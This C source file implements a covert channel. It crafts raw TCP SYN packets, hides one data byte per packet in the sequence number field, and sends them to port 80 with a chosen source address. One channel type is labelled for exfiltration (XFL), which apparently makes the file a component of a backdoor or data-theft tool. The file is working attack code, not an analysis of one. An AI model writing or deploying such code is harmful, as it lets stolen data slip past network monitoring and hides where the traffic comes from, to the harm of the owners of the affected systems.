/*
 * covert.c
 *
 *  Created on: Jun 4, 2014
 *      Author: root
 */

#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/if_ether.h>
#include <net/ethernet.h>
#include <netinet/ether.h>
#include <sys/inotify.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <pthread.h>
#include <signal.h>
#include <sys/types.h>
#include <time.h>

#include "covert.h"
#include "util.h"

static struct _packet {
	struct iphdr ip;
	struct tcphdr tcp;
} packet;

static struct _pseudo_hdr {
	unsigned int source_address;
	unsigned int dest_address;
	unsigned char placeholder;
	unsigned char protocol;
	unsigned short tcp_length;
	struct tcphdr tcp;
} pseudo;

void prep_packet(uint32 src, uint32 dst, int chan_typ, char data) {
	int id = 0;

	id = randomRange(5000, 5050);

	// IP HEADER INIT
	packet.ip.version = IP_VER;
	packet.ip.ihl = IPHDR_LEN;
	packet.ip.tos = 0;
	packet.ip.tot_len = htons(IP_HDR_SIZ + TCP_HDR_SIZ);
	packet.ip.id = htons(id + DEF_IP_ID);
	packet.ip.frag_off = 0;
	packet.ip.ttl = TTL;
	packet.ip.protocol = IPPROTO_TCP;
	packet.ip.check = 0;
	packet.ip.saddr = src;
	packet.ip.daddr = dst;

	// IP HEADER CHECKSUM
	packet.ip.check = chksum((unsigned short *) &packet.ip, IP_HDR_SIZ);

	// TCP HEADER INIT
	switch (chan_typ) {
	case RSP_TYP:
		packet.tcp.source = htons(RSP_PORT);
		break;
	case XFL_TYP:
		packet.tcp.source = htons(XFL_PORT);
		break;
	}

	packet.tcp.dest = htons(80);
	packet.tcp.seq = (data);
	packet.tcp.ack_seq = 0;
	packet.tcp.doff = 5;
	packet.tcp.res1 = 0;
	packet.tcp.fin = 0;
	packet.tcp.syn = 1;
	packet.tcp.rst = 0;
	packet.tcp.psh = 0;
	packet.tcp.ack = 0;
	packet.tcp.urg = 0;
	packet.tcp.res2 = 0;
	packet.tcp.window = htons(512);
	packet.tcp.check = 0;
	packet.tcp.urg_ptr = 0;

	pseudo.source_address = packet.ip.saddr;
	pseudo.dest_address = packet.ip.daddr;
	pseudo.protocol = packet.ip.protocol;
	pseudo.placeholder = 0;
	pseudo.tcp_length = htons(TCP_HDR_SIZ);
	pseudo.tcp = packet.tcp;

	// TCP HEADER CHECKSUM
	packet.tcp.check = chksum((unsigned short *) &pseudo, 32);
}

void _send(uint32 src_addr, uint32 dest_addr, char data, int chan) {
	struct sockaddr_in sin;
	int sock, one = 1;

	prep_packet(src_addr, dest_addr, chan, data);

	sin.sin_family = AF_INET;
	sin.sin_port = packet.tcp.dest;
	sin.sin_addr.s_addr = packet.ip.daddr;

	if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
		error("_send(): Unable to open sending socket.");

	// Tell kernel not to help us out
	if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0)
		error("_send(): Kernel won't allow IP header override.");

	fprintf(stderr, "%c", (packet.tcp.seq));
	sendto(sock, &packet, 40, 0, (struct sockaddr *) &sin, sizeof(sin));
	close(sock);
}

/*-------- Checksum Algorithm (Public domain Ping) ----------------------*/
unsigned short chksum(unsigned short *addr, int len) {
	int nleft = len;
	int sum = 0;
	unsigned short *w = addr;
	unsigned short answer = 0;

	/*
	 * Our algorithm is simple, using a 32 bit accumulator (sum), we add
	 * sequential 16 bit words to it, and at the end, fold back all the
	 * carry bits from the top 16 bits into the lower 16 bits.
	 */
	while (nleft > 1) {
		sum += *w++;
		nleft -= 2;
	}

	/* 4mop up an odd byte, if necessary */
	if (nleft == 1) {
		*(unsigned char *) (&answer) = *(unsigned char *) w;
		sum += answer;
	}

	/* 4add back carry outs from top 16 bits to low 16 bits */
	sum = (sum >> 16) + (sum & 0xffff); /* add hi 16 to low 16 */
	sum += (sum >> 16); /* add carry */
	answer = ~sum; /* truncate to 16 bits */
	return answer;
}
